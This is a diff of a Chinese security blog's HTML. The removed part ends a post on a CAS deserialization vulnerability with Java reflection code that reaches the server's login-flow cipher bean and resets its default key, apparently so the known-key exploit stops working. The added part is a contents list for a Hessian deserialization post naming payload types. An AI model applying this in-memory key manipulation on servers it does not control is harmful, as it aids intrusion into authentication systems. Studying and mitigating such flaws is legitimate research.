class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> ThreadLocalMap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">ThreadLocal.ThreadLocalMap.Entry[]  ThreadLocalMap_Entry = (ThreadLocal.ThreadLocalMap.Entry[])table.get(ThreadLocalMap);</span><br><span class="line"><span class="type">Field</span> <span class="variable">value</span> <span class="operator">=</span> ThreadLocalMap_Entry[<span class="number">6</span>].getClass().getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">value.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">MvcExternalContext</span> <span class="operator">=</span> value.get(ThreadLocalMap_Entry[<span class="number">6</span>]);</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestMap_filed</span> <span class="operator">=</span> MvcExternalContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;requestMap&quot;</span>);</span><br><span class="line">requestMap_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">LocalAttributeMap</span> <span class="operator">=</span> requestMap_filed.get(MvcExternalContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">attributes</span> <span class="operator">=</span> LocalAttributeMap.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">attributes.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span>(Map) attributes.get(LocalAttributeMap);</span><br><span class="line"><span class="type">Object</span> <span class="variable">XmlWebApplicationContext</span> <span class="operator">=</span> map.get(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">beanFactory</span> <span class="operator">=</span> XmlWebApplicationContext.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;beanFactory&quot;</span>);</span><br><span class="line">beanFactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">DefaultListableBeanFactory</span> <span class="operator">=</span> beanFactory.get(XmlWebApplicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">singletonObjects</span> <span class="operator">=</span> DefaultListableBeanFactory.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;singletonObjects&quot;</span>);</span><br><span class="line">singletonObjects.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> (Map) singletonObjects.get(DefaultListableBeanFactory);</span><br><span class="line"><span class="type">Object</span> <span class="variable">loginFlowCipherBean</span> <span class="operator">=</span> map2.get(<span class="string">&quot;loginFlowCipherBean&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115142504-bhxufgb.png" alt="image"></p>
-<p>然后通过调用BufferedBlockCipherBean对象的父类父类的setKeyPassword方法，即可修改为新的key</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line"><span class="type">Field</span> <span class="variable">threadLocals</span> <span class="operator">=</span> thread.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;threadLocals&quot;</span>);</span><br><span class="line">threadLocals.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">ThreadLocalMap</span> <span class="operator">=</span> threadLocals.get(thread);</span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> ThreadLocalMap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">ThreadLocal.ThreadLocalMap.Entry[]  ThreadLocalMap_Entry = (ThreadLocal.ThreadLocalMap.Entry[])table.get(ThreadLocalMap);</span><br><span class="line"><span class="type">Field</span> <span class="variable">value</span> <span class="operator">=</span> ThreadLocalMap_Entry[<span class="number">22</span>].getClass().getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">value.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">MvcExternalContext</span> <span class="operator">=</span> value.get(ThreadLocalMap_Entry[<span class="number">22</span>]);</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestMap_filed</span> <span class="operator">=</span> MvcExternalContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;requestMap&quot;</span>);</span><br><span class="line">requestMap_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">LocalAttributeMap</span> <span class="operator">=</span> requestMap_filed.get(MvcExternalContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">attributes</span> <span class="operator">=</span> LocalAttributeMap.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">attributes.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span>(Map) attributes.get(LocalAttributeMap);</span><br><span class="line"><span class="type">Object</span> <span class="variable">XmlWebApplicationContext</span> <span class="operator">=</span> map.get(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">beanFactory</span> <span class="operator">=</span> XmlWebApplicationContext.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;beanFactory&quot;</span>);</span><br><span class="line">beanFactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">DefaultListableBeanFactory</span> <span class="operator">=</span> beanFactory.get(XmlWebApplicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">singletonObjects</span> <span class="operator">=</span> DefaultListableBeanFactory.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;singletonObjects&quot;</span>);</span><br><span class="line">singletonObjects.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> (Map) singletonObjects.get(DefaultListableBeanFactory);</span><br><span class="line"><span class="type">Object</span> <span class="variable">loginFlowCipherBean</span> <span class="operator">=</span> map2.get(<span class="string">&quot;loginFlowCipherBean&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">setKeyPassword</span> <span class="operator">=</span> loginFlowCipherBean.getClass().getSuperclass().getSuperclass().getMethod(<span class="string">&quot;setKeyPassword&quot;</span>,String.class);</span><br><span class="line">setKeyPassword.invoke(loginFlowCipherBean,<span class="string">&quot;changit2&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115152935-7my1mhx.png" alt="image"></p>
-<p>此时在利用changit生成的payload，漏洞已无法利用</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115155846-30wye1p.png" alt="image"></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="cas反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> cas反序列化漏洞
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -505,6 +419,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%861"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%862-%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91except%E5%88%B0Tostring%E5%AE%8C%E6%88%90%E8%B0%83%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞原理2-通过触发except到Tostring完成调用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-number">2.1.</span> <span class="nav-text">dnslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">2.2.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">文件写入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8webapp%E4%B8%8B%E7%9A%84%E7%B1%BB"><span class="nav-number">2.4.</span> <span class="nav-text">调用webapp下的类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL"><span class="nav-number">2.5.</span> <span class="nav-text">BCEL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.6.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89defineClass"><span class="nav-number">2.7.</span> <span class="nav-text">自定义defineClass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.</span> <span class="nav-text">注意事项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88Hessian%E6%97%A0%E6%B3%95%E8%A7%A6%E5%8F%91TemplatesImpl%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">为什么Hessian无法触发TemplatesImpl类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hessian%E6%83%B3%E8%A6%81%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB%E4%B8%8D%E9%9C%80%E8%A6%81%E5%AE%9E%E7%8E%B0Serializable%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="nav-number">3.2.</span> <span class="nav-text">hessian想要序列化的类不需要实现Serializable序列化接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">3.3.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
